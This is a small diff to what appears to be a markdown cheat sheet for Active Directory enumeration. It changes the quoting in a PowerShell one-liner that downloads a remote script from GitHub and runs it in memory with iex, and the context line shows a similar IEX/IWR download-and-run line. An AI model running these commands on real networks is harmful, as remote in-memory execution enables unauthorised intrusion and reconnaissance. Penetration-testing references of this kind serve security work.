@@ -77,7 +77,7 @@ IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/Power
 ## Native AD Module
 
 ```powershell
-iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+iex (new-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1");Import-ActiveDirectory
 ```
 
 ## General Enumeration
